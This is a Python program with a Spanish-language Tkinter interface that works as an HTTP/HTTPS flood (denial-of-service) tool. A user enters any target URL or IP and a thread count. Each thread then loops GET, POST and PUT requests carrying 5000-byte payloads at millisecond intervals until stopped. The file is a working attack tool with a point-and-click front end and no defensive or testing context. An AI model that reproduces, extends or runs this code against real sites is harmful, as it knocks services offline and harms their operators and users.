import threading
import requests
import time
import tkinter as tk
from tkinter import messagebox
from tkinter import ttk
from ttkthemes import ThemedTk
from PIL import Image, ImageTk

# Variable global para detener el ataque
running = True

# Función para enviar múltiples solicitudes HTTP (GET y POST)
def perform_attack(target_url):
    global running
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
        "Connection": "keep-alive"
    }
    payload = {"key": "A" * 5000}
    while running:
        try:
            # GET request
            response_get = requests.get(target_url, headers=headers)
            print(f"GET {target_url}, estado: {response_get.status_code}")
            
            # POST request
            response_post = requests.post(target_url, headers=headers, data=payload)
            print(f"POST {target_url}, estado: {response_post.status_code}")
            
            # PUT request
            response_put = requests.put(target_url, headers=headers, data=payload)
            print(f"PUT {target_url}, estado: {response_put.status_code}")

        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
        time.sleep(0.001)  # Menor tiempo para generar más tráfico

# Función para iniciar múltiples hilos
def start_attack(target_url, num_threads):
    global running
    running = True
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=perform_attack, args=(target_url,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Función para detener el ataque
def stop_attack():
    global running
    running = False
    print("[*] Ataque detenido.")

# Función para manejar el inicio del ataque desde la interfaz
def start_button_click():
    target_url = entry_url.get()
    try:
        num_threads = int(entry_threads.get())
        if target_url and num_threads > 0:
            threading.Thread(target=start_attack, args=(target_url, num_threads)).start()
            messagebox.showinfo("Ataque iniciado", f"Se ha iniciado el ataque a {target_url} con {num_threads} hilos.")
        else:
            messagebox.showwarning("Datos inválidos", "Por favor, ingrese una URL válida y un número de hilos mayor que 0.")
    except ValueError:
        messagebox.showwarning("Datos inválidos", "Por favor, ingrese un número de hilos válido.")

# Función para manejar la detención del ataque desde la interfaz
def stop_button_click():
    stop_attack()
    messagebox.showinfo("Ataque detenido", "El ataque ha sido detenido.")

# Función para manejar los placeholders
def add_placeholder(entry, placeholder_text):
    entry.insert(0, placeholder_text)
    entry.configure(foreground='grey')

    def on_focus_in(event):
        if entry.get() == placeholder_text:
            entry.delete(0, tk.END)
            entry.configure(foreground='black')

    def on_focus_out(event):
        if entry.get() == '':
            entry.insert(0, placeholder_text)
            entry.configure(foreground='grey')

    entry.bind("<FocusIn>", on_focus_in)
    entry.bind("<FocusOut>", on_focus_out)

# Crear la ventana de la interfaz gráfica usando ThemedTk para aplicar un tema moderno
root = ThemedTk(theme="arc")
root.title("Inundación HTTP/HTTPS")
root.geometry("600x550")

# Título del sistema
label_title = ttk.Label(root, text="Sistema Ataque de inundación HTTP/HTTPS", font=('Helvetica', 18, 'bold'))
label_title.pack(pady=20)

# Cargar la imagen de ataque cibernético (agregarla en la parte superior)
try:
    cyber_attack_img = Image.open("imagenes/ataque_cibernetico.png")
    cyber_attack_img = cyber_attack_img.resize((100, 100), Image.Resampling.LANCZOS)
    cyber_attack_photo = ImageTk.PhotoImage(cyber_attack_img)
    label_img = ttk.Label(root, image=cyber_attack_photo)
    label_img.pack(pady=10)  # Añadir la imagen con espacio superior e inferior
except Exception as e:
    print(f"Error al cargar la imagen: {e}")

# Etiqueta y entrada para la URL objetivo (con placeholder)
entry_url = tk.Entry(root, width=50, font=('Helvetica', 14))
entry_url.pack(pady=10, padx=10)
add_placeholder(entry_url, "Ingrese la URL o IP objetivo")

# Etiqueta y entrada para el número de hilos (con placeholder)
entry_threads = tk.Entry(root, width=50, font=('Helvetica', 14))
entry_threads.pack(pady=10, padx=10)
add_placeholder(entry_threads, "Ingrese el número de hilos")

# Botón para iniciar el ataque con ícono
icon_start = Image.open("imagenes/start_icon.png")
icon_start = icon_start.resize((40, 40), Image.Resampling.LANCZOS)
icon_start = ImageTk.PhotoImage(icon_start)
button_start = ttk.Button(root, text="Iniciar ataque", image=icon_start, compound=tk.LEFT, command=start_button_click)
button_start.pack(pady=20)

# Botón para detener el ataque con ícono
icon_stop = Image.open("imagenes/stop_icon.png")
icon_stop = icon_stop.resize((40, 40), Image.Resampling.LANCZOS)
icon_stop = ImageTk.PhotoImage(icon_stop)
button_stop = ttk.Button(root, text="Detener ataque", image=icon_stop, compound=tk.LEFT, command=stop_button_click)
button_stop.pack(pady=10)

# Ejecutar la interfaz gráfica
root.mainloop()
